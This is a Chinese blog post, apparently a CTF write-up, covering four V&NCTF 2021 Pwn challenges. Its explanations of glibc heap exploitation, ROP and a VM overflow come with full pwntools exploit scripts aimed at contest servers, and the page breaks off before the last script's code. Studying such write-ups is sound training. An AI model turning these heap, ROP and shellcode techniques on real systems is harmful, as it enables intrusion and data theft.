@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>2021V&amp;NCTF-Pwn方向writeup | velta&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="CTF">
+    <meta name="description" content="年初打的一场个人赛，拿了Pwn方向第一。 1.LittleRedFlower题目首先给了libc地址。然后根据提示修改tcache_max_bins，想到可以增大tcache_max_bins来延长tcache_perthread_struct到可控制的堆块上，因此任意写一个字节用来将tcache_max_bins增大为0x240。关于tcache_perthread_struct的关键逻辑可以在">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021V&amp;NCTF-Pwn方向writeup">
+<meta property="og:url" content="http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/index.html">
+<meta property="og:site_name" content="velta&#39;s blog">
+<meta property="og:description" content="年初打的一场个人赛，拿了Pwn方向第一。 1.LittleRedFlower题目首先给了libc地址。然后根据提示修改tcache_max_bins，想到可以增大tcache_max_bins来延长tcache_perthread_struct到可控制的堆块上，因此任意写一个字节用来将tcache_max_bins增大为0x240。关于tcache_perthread_struct的关键逻辑可以在">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/ZK3zQji9E6rIOm5.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/OqZct2Rr3Kza1ef.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/EV4KHOlb72UQR5s.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/jL6unVwQ3hs91y2.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/ZV4R9EvqbAp8uMI.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/14/vjWik4L1ZDqYG5F.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/j9vmzrg1lDeBfJc.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/N8ynRihAkr4D2Xg.png">
+<meta property="og:image" content="https://i.loli.net/2021/03/15/eLEctQP2kusiYzB.png">
+<meta property="og:updated_time" content="2021-08-17T01:28:19.763Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/03/14/ZK3zQji9E6rIOm5.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="velta&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">velta</h5>
+          <a href="mailto:1020217451@qq.com" target="_blank" rel="noopener" title="1020217451@qq.com" class="mail">1020217451@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/veltavid" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">2021V&amp;NCTF-Pwn方向writeup</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">2021V&amp;NCTF-Pwn方向writeup</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-08-17T01:12:31.000Z" itemprop="datePublished" class="page-time">
+  2021-08-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-LittleRedFlower"><span class="post-toc-number">1.</span> <span class="post-toc-text">1.LittleRedFlower</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-hh"><span class="post-toc-number">2.</span> <span class="post-toc-text">2.hh</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-White-Give-Flag"><span class="post-toc-number">3.</span> <span class="post-toc-text">3.White_Give_Flag</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#4-ff"><span class="post-toc-number">4.</span> <span class="post-toc-text">4.ff</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-2021VNCTF-Pwn方向writeup"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">2021V&NCTF-Pwn方向writeup</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-08-17 09:12:31" datetime="2021-08-17T01:12:31.000Z"  itemprop="datePublished">2021-08-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>年初打的一场个人赛，拿了Pwn方向第一。</p>
+<h4 id="1-LittleRedFlower"><a href="#1-LittleRedFlower" class="headerlink" title="1.LittleRedFlower"></a>1.LittleRedFlower</h4><p>题目首先给了libc地址。然后根据提示修改tcache_max_bins，想到可以增大tcache_max_bins来延长tcache_perthread_struct到可控制的堆块上，因此任意写一个字节用来将tcache_max_bins增大为0x240。关于tcache_perthread_struct的关键逻辑可以在malloc中找到，如下图所示。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/ZK3zQji9E6rIOm5.png" alt="image-20210314225447429" title="">
+                </div>
+                <div class="image-caption">image-20210314225447429</div>
+            </figure>
+
+<p>可以看出tcache bin size真正属于tcache_perthread_struct的部分固定为0x80大小，不会随tcache_max_bins改变。但是在根据请求的size寻找时还是用2*(size-0x20)/0x10来定位的，寻找tcache bin指向的堆块时也还是固定先加0x80。</p>
+<p>我选择用的是0x14a0大小的堆块，此时标识其tcache bin size的地址位于一开始分配的0x210大小堆块中，其中size均为0x101，只需要再控制heap_base+0x290+0x840的地方为free_hook-0x110的地址即可。</p>
+<p>然后就是setcontext一把梭了，只是需要找一个gadget来将rdi的相关值赋给rdx并且能够劫持之后的控制流，这个gadget位于0x154b20处。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/OqZct2Rr3Kza1ef.png" alt="image-20210314230310600" title="">
+                </div>
+                <div class="image-caption">image-20210314230310600</div>
+            </figure>
+
+<p>最终ROP调用mprotect加shellcode读出flag。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/EV4KHOlb72UQR5s.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	sub rsp, 0x800</span></span><br><span class="line"><span class="string">	push 0x67616c66</span></span><br><span class="line"><span class="string">	mov rdi, rsp</span></span><br><span class="line"><span class="string">	xor esi, esi</span></span><br><span class="line"><span class="string">	mov eax, 2</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	cmp eax, 0</span></span><br><span class="line"><span class="string">	js failed</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	mov edi, eax</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edx, 0x100</span></span><br><span class="line"><span class="string">	xor eax, eax</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	mov edx, eax</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edi, 1</span></span><br><span class="line"><span class="string">	mov eax, edi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	jmp exit</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	failed:</span></span><br><span class="line"><span class="string">	push 0x6c696166</span></span><br><span class="line"><span class="string">	mov edi, 1</span></span><br><span class="line"><span class="string">	mov rsi, rsp</span></span><br><span class="line"><span class="string">	mov edx, 4</span></span><br><span class="line"><span class="string">	mov eax, edi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	exit:</span></span><br><span class="line"><span class="string">	xor edi, edi</span></span><br><span class="line"><span class="string">	mov eax, 231</span></span><br><span class="line"><span class="string">	syscall'''</span></span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./flower')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27152</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'GIFT: '</span>)</span><br><span class="line">libc_base=int(sh.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x1EB6A0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">free_hook=libc_base+<span class="number">0x1EDB20</span></span><br><span class="line">free_hook2=free_hook&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">tmax_bins=libc_base+<span class="number">0x1EA2D0</span></span><br><span class="line">read_addr=libc_base+<span class="number">0x1111F0</span></span><br><span class="line">setcontext=libc_base+<span class="number">0x5803D</span></span><br><span class="line">mprotect=libc_base+<span class="number">0x11BB40</span></span><br><span class="line">gadget_addr=libc_base+<span class="number">0x154B20</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x26bb2</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2709c</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x11c3b1</span></span><br><span class="line">write_addr=libc_base+<span class="number">0x111290</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'anywhere'</span>,p64(tmax_bins+<span class="number">1</span>))</span><br><span class="line">sh.sendafter(<span class="string">'what?'</span>,p8(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'Offset:'</span>,str(<span class="number">0x830</span>))</span><br><span class="line">sh.sendafter(<span class="string">'Content:'</span>,p64(free_hook<span class="number">-0x110</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'size:'</span>,str(<span class="number">0x1450</span>+<span class="number">4</span>*<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook2</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook2</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rip = read_addr</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x110</span>+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(setcontext)+str(frame)[<span class="number">0x28</span>:]</span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendafter(<span class="string">'&gt;&gt;'</span>,payload.ljust(<span class="number">0x110</span>,<span class="string">'\x00'</span>)+p64(gadget_addr))</span><br><span class="line"></span><br><span class="line">layout=p64(pop_rdi)+p64(free_hook2)+p64(pop_rsi)+p64(<span class="number">0x2000</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(free_hook2+<span class="number">8</span>*<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">sh.send(layout+shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-hh"><a href="#2-hh" class="headerlink" title="2.hh"></a>2.hh</h4><p>vmpwn题，操作码与操作数都固定为4字节。利用9和0xc这两种指令可以栈溢出。</p>
+<p>用9将任意4字节写到v32[++v16+0x1000]中。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/jL6unVwQ3hs91y2.png" alt="image-20210314231425490" title="">
+                </div>
+                <div class="image-caption">image-20210314231425490</div>
+            </figure>
+
+<p>用0xc将刚写入的数再写到栈上任意位置处。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/ZV4R9EvqbAp8uMI.png" alt="image-20210314231500795" title="">
+                </div>
+                <div class="image-caption">image-20210314231500795</div>
+            </figure>
+
+<p>v32数组一共有2002个元素，因此下标从2006开始就是返回地址了。</p>
+<p>构造的rop先利用puts函数泄露出libc相关地址再返回main函数。</p>
+<p>第二次rop中先read一个flag字符串到内存中，然后orw读出flag即可。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/14/vjWik4L1ZDqYG5F.png" alt="image-20210314232543313" title="">
+                </div>
+                <div class="image-caption">image-20210314232543313</div>
+            </figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_8</span><span class="params">(offset,value)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> p32(<span class="number">9</span>)+p32(value&amp;<span class="number">0xffffffff</span>)+p32(<span class="number">0xc</span>)+p32(offset)+p32(<span class="number">9</span>)+p32((value&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>)+p32(<span class="number">0xc</span>)+p32(offset+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./hh')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25073</span>)</span><br><span class="line">pop_rdi=<span class="number">0x4011a3</span></span><br><span class="line">puts_got=<span class="number">0x601FA8</span></span><br><span class="line">puts_plt=<span class="number">0x4006F0</span></span><br><span class="line">main_addr=<span class="number">0x401084</span></span><br><span class="line">flag_addr=<span class="number">0x60Bd00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=set_8(<span class="number">1005</span>,<span class="number">0</span>)+set_8(<span class="number">1007</span>,pop_rdi)+set_8(<span class="number">1009</span>,puts_got)+set_8(<span class="number">1011</span>,puts_plt)</span><br><span class="line">code+=set_8(<span class="number">1013</span>,main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">"code:"</span>,code+p32(<span class="number">0x10</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x6F6A0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">open_addr=libc_base+<span class="number">0xF70F0</span></span><br><span class="line">read_addr=libc_base+<span class="number">0xF7310</span></span><br><span class="line">write_addr=libc_base+<span class="number">0xF7370</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x202f8</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code=set_8(<span class="number">1005</span>,<span class="number">0</span>)+set_8(<span class="number">1007</span>,pop_rdi)+set_8(<span class="number">1009</span>,<span class="number">0</span>)+set_8(<span class="number">1011</span>,pop_rsi)+set_8(<span class="number">1013</span>,flag_addr)+set_8(<span class="number">1015</span>,pop_rdx)+set_8(<span class="number">1017</span>,<span class="number">7</span>)+set_8(<span class="number">1019</span>,read_addr)<span class="comment">#read "flag"</span></span><br><span class="line">code+=set_8(<span class="number">1021</span>,pop_rdi)+set_8(<span class="number">1023</span>,flag_addr)+set_8(<span class="number">1025</span>,pop_rsi)+set_8(<span class="number">1027</span>,<span class="number">0</span>)+set_8(<span class="number">1029</span>,pop_rdx)+set_8(<span class="number">1031</span>,<span class="number">0</span>)+set_8(<span class="number">1033</span>,open_addr)</span><br><span class="line">code+=set_8(<span class="number">1035</span>,pop_rdi)+set_8(<span class="number">1037</span>,<span class="number">3</span>)+set_8(<span class="number">1039</span>,pop_rsi)+set_8(<span class="number">1041</span>,flag_addr)+set_8(<span class="number">1043</span>,pop_rdx)+set_8(<span class="number">1045</span>,<span class="number">0x30</span>)+set_8(<span class="number">1047</span>,read_addr)</span><br><span class="line">code+=set_8(<span class="number">1049</span>,pop_rdi)+set_8(<span class="number">1051</span>,<span class="number">1</span>)+set_8(<span class="number">1053</span>,pop_rsi)+set_8(<span class="number">1055</span>,flag_addr)+set_8(<span class="number">1057</span>,pop_rdx)+set_8(<span class="number">1059</span>,<span class="number">0x30</span>)+set_8(<span class="number">1061</span>,write_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendafter(<span class="string">"code:"</span>,code+p32(<span class="number">0x10</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.send(<span class="string">'./flag\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-White-Give-Flag"><a href="#3-White-Give-Flag" class="headerlink" title="3.White_Give_Flag"></a>3.White_Give_Flag</h4><p>初始化时将flag写入到一个随机大小的堆块中，这个堆块大小在0x310~0x510之间。</p>
+<p>漏洞点如下图所示，其中v4是read的返回值。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/15/j9vmzrg1lDeBfJc.png" alt="image-20210315090637954" title="">
+                </div>
+                <div class="image-caption">image-20210315090637954</div>
+            </figure>
+
+<p>只要控制read返回值为0就会造成0x202120处数组的反向溢出，此时该位置是第四个堆块，可以泄露出其中存储的flag。通过shutdown可以使read返回值为0。</p>
+<p>猜测题目环境是存在tcache的，所以先分配3个小于0x200的堆块，然后分配一个在0x310到0x510之间的堆块即可，不过还要保证堆块size字段最低字节大于等于0x20，最后在第4个堆块的前16字节填充垃圾数据。爆破得到flag。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/15/N8ynRihAkr4D2Xg.png" alt="flag" title="">
+                </div>
+                <div class="image-caption">flag</div>
+            </figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'\n'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'size:\n'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'index:\n'</span>,str(index))</span><br><span class="line">	sh.sendafter(<span class="string">'Content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'choice:'</span>,<span class="string">'a\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process('./white')</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	sh=remote(<span class="string">'node4.buuoj.cn'</span>,<span class="number">39123</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">		add(<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="number">0x350</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">"b"</span>*<span class="number">16</span>)</span><br><span class="line">	sh.shutdown()</span><br><span class="line">	sh.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">	res=sh.recvline()</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">'&#123;'</span> <span class="keyword">in</span> res):</span><br><span class="line">		print(res)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	sh.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-ff"><a href="#4-ff" class="headerlink" title="4.ff"></a>4.ff</h4><p>题目存在uaf，但在分配了堆块之后就只能对该堆块操作。</p>
+<p>思路是先利用2次edit绕过tcache的double free检测，然后可以分配堆块到tcache_perthread_struct，不过题目环境是glibc 2.32，存在safe linking保护，所以还需要show一次泄露异或后的堆地址。</p>
+<p>分配到tcache_perthread_struct后将0x290大小的tcache bin容量改为7，再free掉进入unsorted bin中。此时可以通过切分tcache_perthread_struct将libc相关地址作为0x50大小的tcache bin指向的堆块。</p>
+<p>随后修改残留的libc地址为stdout的地址，该步需要爆破，从而泄露出libc基址。</p>
+<p>最后继续切分残留在unsorted bin中的tcache_perthread_struct将free_hook分配出来，修改为system拿shell。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2021/03/15/eLEctQP2kusiYzB.png" alt="flag" title="">
+                </div>
+                <div class="image-caption">flag</div>
+            </figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 